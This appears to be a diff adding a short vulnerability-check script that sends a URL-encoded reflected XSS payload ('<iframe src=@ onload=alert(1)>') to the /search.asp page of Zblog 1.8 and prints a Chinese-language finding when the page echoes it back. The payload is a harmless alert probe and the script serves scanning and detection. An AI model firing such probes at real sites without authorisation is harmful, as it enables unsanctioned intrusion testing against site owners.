@@ -1,0 +1,13 @@
+#request url = var
+#define payload = /search.asp?q=%3Ciframe%20src%3D%40%20onload%3Dalert%281%29%3E
+#define bug = <iframe src=@ onload=alert(1)>
+#define info = /search.asp?q=%3Ciframe%20src%3D%40%20onload%3Dalert%281%29%3E|存在Zblog 1.8 /search.asp XSS漏洞
+
+function main(args)
+{
+	res = HttpGet(url.payload,"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:85.0) Gecko/20100101 Firefox/85.0");
+	if(StrFindStr(res[0],bug,0)!= "-1")
+	{
+		print(url.info);
+	}
+}
